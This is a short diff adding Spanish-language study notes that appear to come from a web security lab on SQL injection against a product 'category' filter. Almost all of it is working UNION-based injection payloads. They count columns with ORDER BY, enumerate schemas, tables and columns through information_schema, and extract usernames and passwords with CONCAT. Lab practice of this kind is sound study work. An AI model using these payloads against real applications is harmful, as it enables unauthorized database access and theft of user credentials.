@@ -1,0 +1,15 @@
+// Listando el contendido de las bases de datos no Oracle
+/filter=category=Pets => Filtro donde esta la vulnerabilidad
+/filter=category=Pets' ORDER BY 2 -- - => Determinar el número de columnas a base de error
+/filter=category=Pets' UNION SELECT '1',schema_name FROM information_schema.schemata -- - => Listamos las base de datos ya que hay 2 columnas
+/filter=category=' UNION SELECT '1',schema_name FROM information_schema.schemata -- -
+/filter=category' UNION SELECT '1',table_name FROM information_schema.tables WHERE table_schema='public' -- - => Listamos la lista de tablas de la base de datos con nombre public
+/filter=category' UNION SELECT '1',column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users_qgkkjq' -- -
+/filter=category' UNION SELECT username_msqbpe,password_mikjwq FROM public.users_qgkkjq -- - => Enumerar  el usuario y contraseña de la base de datos
+/filter=category' UNION SELECT NULL,CONCAT(username_msqbpe,':',password_mikjwq) FROM public.users_qgkkjq -- - => Agrupar los resultados
+/filter=category' UNION SELECT NULL,CONCAT(username_ukfvui,':',password_wqgfbp) FROM public.users_rrzmnd -- - => CONCAT
+
+Columnas de la tabla users_qgkkjq
+- email
+- password_mikjwq
+- username_msqbpe
